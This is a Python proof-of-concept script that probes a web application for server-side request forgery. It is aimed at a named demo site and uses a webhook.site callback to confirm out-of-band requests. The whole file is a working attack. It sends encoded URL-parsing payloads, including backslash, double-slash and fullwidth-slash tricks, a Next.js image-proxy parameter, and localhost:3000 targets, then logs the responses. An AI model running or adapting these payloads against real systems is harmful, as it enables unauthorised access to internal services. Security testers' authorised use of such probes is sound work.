#!/usr/bin/env python3
"""
python3 poc_ssrf.py \
  --target https://demo.djangocfg.com \
  --prove https://webhook.site/05f5d63c-5397-43ad-9e02-b32d0c8356a0


poc_ssrf.py
Simple, non-destructive SSRF probe: sends a short set of paths that commonly
trigger URL-parsing bugs. Only GET requests. Records responses and prints a summary.

Usage:
  python3 poc_ssrf.py --target https://demo.djangocfg.com --prove https://webhook.site/XXXX
"""
import requests, argparse, time, json, urllib.parse
from typing import List

DEFAULT_PAYLOADS = [
    "/%5C%5Clocalhost:3000",
    "/%5Chttp://127.0.0.1:3000",
    "//http://localhost:3000",
    "//127.0.0.1:3000",
    "/%5Chttps://{prove_host}".format(prove_host="{PROVE_HOST}"),
    "/%255Chttps://{prove_host}".format(prove_host="{PROVE_HOST}"),
    "/%EF%BC%8Fhttps://{prove_host}".format(prove_host="{PROVE_HOST}"),
    "/_next/image?url=%5C%5Chttps%3A//{prove_host}&w=64&q=75".format(prove_host="{PROVE_HOST}"),
    "/.well-known/%5Chttps://{prove_host}".format(prove_host="{PROVE_HOST}"),
]

HEADERS = {"User-Agent": "poc-ssrf/1.0"}

def run_once(target: str, prove: str, out_json: str = "poc_ssrf_results.json"):
    prove_host = urllib.parse.urlparse(prove).netloc if prove else "example.com"
    payloads = [p.format(PROVE_HOST=prove_host) for p in DEFAULT_PAYLOADS]
    results = {"target": target, "prove": prove, "runs": []}
    for p in payloads:
        url = target.rstrip("/") + p
        try:
            r = requests.get(url, headers=HEADERS, timeout=8, allow_redirects=False)
            status = r.status_code
            loc = r.headers.get("location")
            snippet = (r.text or "")[:400]
            print(f"[+] {p} -> status={status} loc={loc}")
            results["runs"].append({"path": p, "status": status, "location": loc, "snippet": snippet})
        except Exception as e:
            print(f"[!] {p} -> error: {e}")
            results["runs"].append({"path": p, "error": str(e)})
        time.sleep(0.2)
    with open(out_json, "w") as f:
        json.dump(results, f, indent=2)
    print(f"[+] Saved {out_json}. Now check your PROVE_URL for hits.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--prove", required=True)
    parser.add_argument("--out", default="poc_ssrf_results.json")
    args = parser.parse_args()
    run_once(args.target, args.prove, args.out)
